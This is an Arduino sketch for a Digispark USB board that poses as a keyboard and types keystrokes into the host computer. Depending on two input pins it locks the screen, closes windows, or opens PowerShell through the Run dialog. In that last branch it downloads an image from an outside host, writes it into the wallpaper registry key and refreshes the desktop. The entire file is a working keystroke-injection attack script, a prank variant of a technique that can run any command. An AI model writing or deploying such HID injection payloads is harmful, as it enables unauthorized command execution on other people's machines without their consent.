#include "DigiKeyboard.h"
int H1;
int H2;


void setup() {
 pinMode(0, INPUT);
 pinMode(1, INPUT);

}

void loop() {
H1 = digitalRead(0);
H2 = digitalRead(1);



if (H1 == 1 && H2 == 0)                                             
  {                                           
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_L, MOD_GUI_LEFT);                                     
  }                 
  
  else if (H1 == 1 && H2 == 1)                                               
   {                                           
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_W, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);   
      
   }   

  else if (H1 == 0 && H2 == 1)                                               
   {                                           
   DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$client.DownloadFile(\"https://112291-319675-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2018/07/Why-is-Getting-Hacked-Harmful.-1080x675.jpg\" , \"wall.jpg\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%USERPROFILE%\\wall.jpg\" /f");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
      
   }   
}
